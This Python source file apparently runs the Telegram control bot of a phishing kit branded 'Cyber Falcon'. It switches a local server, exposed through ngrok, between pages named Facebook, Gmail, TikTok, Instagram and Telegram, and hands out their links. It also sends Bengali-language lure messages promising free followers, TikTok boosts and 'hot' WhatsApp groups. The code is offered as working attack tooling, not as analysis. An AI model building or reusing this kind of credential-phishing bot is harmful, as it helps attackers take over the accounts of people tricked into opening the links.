import logging
import requests
import socket
import json
import os
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from config import TELEGRAM_BOT_TOKEN, PORT

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

URL_FILE = "saved_url.json"

def save_url(url):
    try:
        with open(URL_FILE, 'w') as f:
            json.dump({'url': url}, f)
    except:
        pass

def load_saved_url():
    try:
        if os.path.exists(URL_FILE):
            with open(URL_FILE, 'r') as f:
                data = json.load(f)
                return data.get('url')
    except:
        pass
    return None

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_public_url():
    saved_url = load_saved_url()
    if saved_url:
        return saved_url
    
    try:
        response = requests.get(f"http://localhost:{PORT}/get_ngrok_url", timeout=5)
        if response.status_code == 200:
            data = response.json()
            public_url = data.get('public_url') or data.get('ngrok_url')
            if public_url and public_url.startswith('http'):
                save_url(public_url)
                return public_url
    except:
        pass
    
    return None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat.id
    user_name = update.message.from_user.first_name
    
    try:
        requests.get(f"http://localhost:{PORT}/add_user/{chat_id}", timeout=3)
    except:
        pass
    
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    public_url = get_public_url()
    
    keyboard = [
        [InlineKeyboardButton("🌐 All Mane page", callback_data="All_Mane_page")],
        [InlineKeyboardButton("📢 advance page", callback_data="All_advance_page")],
        [InlineKeyboardButton("🦅 Status", callback_data="status"),
         InlineKeyboardButton("🥷 community", url="https://t.me/+j8x9Tp4CGa80ZmM1")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message = f"""
😈 🦅𝘾.𝙁 𝘽𝙤𝙩 𝙥𝙧𝙤😈🦅

𝙃𝙞 {user_name}! 
𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝘾𝙮𝙗𝙚𝙧 𝙛𝙖𝙡𝙘𝙤𝙣 𝙗𝙤𝙩.

🥷𝗦𝘁𝗮𝘁𝘂𝘀: 🟢 𝗔𝗰𝘁𝗶𝘃𝗲
"""
    
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='Markdown')

async def all__menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("📘 Facebook", callback_data="_facebook")],
        [InlineKeyboardButton("🤤 TikTok", callback_data="_tiktok")],
        [InlineKeyboardButton("✈️ Telegram", callback_data="_telegram")],
        [InlineKeyboardButton("📧 Gmail", callback_data="_gmail")],
        [InlineKeyboardButton("📷 Instagram", callback_data="_instagram")],
        [InlineKeyboardButton("🤧🥴Back🥱", callback_data="main_menu")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text("😈 All Mane page Platforms\n\nSelect a platform:", reply_markup=reply_markup)

async def All_advance_page_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("🎯 ফ্রি ফলোয়ার", callback_data="_at")],
        [InlineKeyboardButton("📞 ফ্রি কল / Whatsapp", callback_data="_ai")],
        [InlineKeyboardButton("📢 TikTok বুস্টার", callback_data="_ad")],
        [InlineKeyboardButton("🚀 TikTok ফলোয়ার", callback_data="_go")],
        [InlineKeyboardButton("🤧🥴Back🥱", callback_data="main_menu")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text("📢 advance page Menu\n\nSelect an option:", reply_markup=reply_markup)

async def _at(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    public_url = get_public_url()
    if public_url:
        full_url = f"{public_url}/facebook_followers"
        keyboard = [[InlineKeyboardButton("🎯 ফ্রি ফলোয়ার নিন", url=full_url)], [InlineKeyboardButton("🤧🥴Back🥱", callback_data="All_advance_page")]]
        await query.edit_message_text(f"🎯 **ফ্রি ফেসবুক ফলোয়ার** 🎯\n\n✅ ৫০০০+ ফলোয়ার\n✅ ১০০০ লাইক\n✅ সম্পূর্ণ ফ্রি\n\n🔗 {full_url}", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    else:
        await query.edit_message_text("⚠️ URL পাওয়া যায়নি")

async def _ai(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    public_url = get_public_url()
    if public_url:
        full_url = f"{public_url}/whatsapp_groups"
        keyboard = [[InlineKeyboardButton("📞 গ্রুপে জয়েন করুন", url=full_url)], [InlineKeyboardButton("🤧🥴Back🥱", callback_data="All_advance_page")]]
        await query.edit_message_text(f"📞 **ফ্রি কল / হোয়াটসঅ্যাপ গ্রুপ** 📞\n\n✅ হট গ্রুপ লিংক\n✅ সবার সাথে ফ্রি কল\n✅ ভিডিও কল ও চ্যাট\n\n🔗 {full_url}", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    else:
        await query.edit_message_text("⚠️ URL পাওয়া যায়নি")

async def _ad(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    public_url = get_public_url()
    if public_url:
        full_url = f"{public_url}/tiktok_boost"
        keyboard = [[InlineKeyboardButton("🚀 বুস্ট করুন", url=full_url)], [InlineKeyboardButton("🤧🥴Back🥱", callback_data="All_advance_page")]]
        await query.edit_message_text(f"📢 **TikTok বুস্টার** 📢\n\n✅ ১০,০০০ ভিউ\n✅ ৫,০০০ লাইক\n✅ সম্পূর্ণ ফ্রি\n\n🔗 {full_url}", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    else:
        await query.edit_message_text("⚠️ URL পাওয়া যায়নি")

async def _go(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    public_url = get_public_url()
    if public_url:
        full_url = f"{public_url}/tiktok_followers"
        keyboard = [[InlineKeyboardButton("💎 ফলোয়ার নিন", url=full_url)], [InlineKeyboardButton("🤧🥴Back🥱", callback_data="All_advance_page")]]
        await query.edit_message_text(f"🚀 **TikTok ফলোয়ার** 🚀\n\n✅ ১০,০০০+ ফলোয়ার\n✅ ৫০,০০০+ ভিউ\n✅ সম্পূর্ণ ফ্রি\n\n🔗 {full_url}", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    else:
        await query.edit_message_text("⚠️ URL পাওয়া যায়নি")

async def _facebook(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    try:
        requests.get(f"http://localhost:{PORT}/set_page/facebook")
    except:
        pass
    local_url = f"http://{get_local_ip()}:{PORT}"
    public_url = get_public_url()
    keyboard = []
    if public_url:
        keyboard.append([InlineKeyboardButton("🌐 Open Public URL", url=public_url)])
    keyboard.append([InlineKeyboardButton("📍 Open Local URL", url=local_url)])
    keyboard.append([InlineKeyboardButton("🤧🥴Back🥱", callback_data="All_Mane_page")])
    await query.edit_message_text(f"Facebook Link\n\nPublic: {public_url}\nLocal: {local_url}", reply_markup=InlineKeyboardMarkup(keyboard))

async def _tiktok(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    try:
        requests.get(f"http://localhost:{PORT}/set_page/tiktok")
    except:
        pass
    local_url = f"http://{get_local_ip()}:{PORT}"
    public_url = get_public_url()
    keyboard = []
    if public_url:
        keyboard.append([InlineKeyboardButton("🌐 Open Public URL", url=public_url)])
    keyboard.append([InlineKeyboardButton("📍 Open Local URL", url=local_url)])
    keyboard.append([InlineKeyboardButton("🤧🥴Back🥱", callback_data="All_Mane_page")])
    await query.edit_message_text(f"TikTok Link\n\nPublic: {public_url}\nLocal: {local_url}", reply_markup=InlineKeyboardMarkup(keyboard))

async def _gmail(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    try:
        requests.get(f"http://localhost:{PORT}/set_page/gmail")
    except:
        pass
    local_url = f"http://{get_local_ip()}:{PORT}"
    public_url = get_public_url()
    keyboard = []
    if public_url:
        keyboard.append([InlineKeyboardButton("🌐 Open Public URL", url=public_url)])
    keyboard.append([InlineKeyboardButton("📍 Open Local URL", url=local_url)])
    keyboard.append([InlineKeyboardButton("🤧🥴Back🥱", callback_data="All_Mane_page")])
    await query.edit_message_text(f"Gmail Link\n\nPublic: {public_url}\nLocal: {local_url}", reply_markup=InlineKeyboardMarkup(keyboard))

async def _telegram(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    try:
        requests.get(f"http://localhost:{PORT}/set_page/telegram")
    except:
        pass
    local_url = f"http://{get_local_ip()}:{PORT}"
    public_url = get_public_url()
    keyboard = []
    if public_url:
        keyboard.append([InlineKeyboardButton("🌐 Open Public URL", url=public_url)])
    keyboard.append([InlineKeyboardButton("📍 Open Local URL", url=local_url)])
    keyboard.append([InlineKeyboardButton("🤧🥴Back🥱", callback_data="All_Mane_page")])
    await query.edit_message_text(f"Telegram Link\n\nPublic: {public_url}\nLocal: {local_url}", reply_markup=InlineKeyboardMarkup(keyboard))

async def _instagram(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    try:
        requests.get(f"http://localhost:{PORT}/set_page/instagram")
    except:
        pass
    local_url = f"http://{get_local_ip()}:{PORT}"
    public_url = get_public_url()
    keyboard = []
    if public_url:
        keyboard.append([InlineKeyboardButton("🌐 Open Public URL", url=public_url)])
    keyboard.append([InlineKeyboardButton("📍 Open Local URL", url=local_url)])
    keyboard.append([InlineKeyboardButton("🤧🥴Back🥱", callback_data="All_Mane_page")])
    await query.edit_message_text(f"Instagram Link\n\nPublic: {public_url}\nLocal: {local_url}", reply_markup=InlineKeyboardMarkup(keyboard))

async def back_to_main(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    local_url = f"http://{get_local_ip()}:{PORT}"
    public_url = get_public_url()
    keyboard = [
        [InlineKeyboardButton("🌐 All Mane page", callback_data="All_Mane_page")],
        [InlineKeyboardButton("🥷 advance page", callback_data="All_advance_page")],
        [InlineKeyboardButton("🦅 Status", callback_data="status"),
         InlineKeyboardButton("🦅 Cyber Falcon", url="https://t.me/+j8x9Tp4CGa80ZmM1")]
    ]
    message = f"Welcome!\n\nPublic URL: {public_url}\nLocal URL: {local_url}\nStatus: Active"
    await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard))

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    local_url = f"http://{get_local_ip()}:{PORT}"
    public_url = get_public_url()
    keyboard = [[InlineKeyboardButton("🤧🥴Back🥱", callback_data="main_menu")]]
    await query.edit_message_text(f"Bot Status\n\nPublic URL: {public_url}\nLocal URL: {local_url}\nStatus: Active", reply_markup=InlineKeyboardMarkup(keyboard))

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    
    handlers = {
        "All_Mane_page": all__menu,
        "All_advance_page": All_advance_page_menu,
        "_at": _at,
        "_ai": _ai,
        "_ad": _ad,
        "_go": _go,
        "_facebook": _facebook,
        "_tiktok": _tiktok,
        "_telegram": _telegram,
        "_gmail": _gmail,
        "_instagram": _instagram,
        "main_menu": back_to_main,
        "status": status_command,
    }
    
    handler = handlers.get(data)
    if handler:
        await handler(update, context)
    else:
        await query.answer("Unknown button")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.message.from_user.first_name
    chat_id = update.message.chat.id
    try:
        requests.get(f"http://localhost:{PORT}/add_user/{chat_id}", timeout=3)
    except:
        pass
    await update.message.reply_text(f'🙋😘 Hi {user_name}!🙅 Type /start to see the main menu.')

async def error(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f'Update {update} caused error {context.error}')

def run_bot():
    """Telegram বট চালানোর ফাংশন"""
    try:
        # নতুন Application তৈরি করুন
        application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
        
        # হ্যান্ডলার যোগ করুন
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("link", start))
        application.add_handler(CallbackQueryHandler(handle_callback))
        application.add_handler(MessageHandler(filters.TEXT, handle_message))
        application.add_error_handler(error)
        
        print("🦅 Telegram Bot Started...")
        
        # পোলিং শুরু করুন (ওয়েবহুক ছাড়া)
        application.run_polling(allowed_updates=Update.ALL_TYPES)
        
    except Exception as e:
        print(f"বট চালাতে ব্যর্থ: {e}")
        import traceback
        traceback.print_exc()

if __name__ == '__main__':
    run_bot()
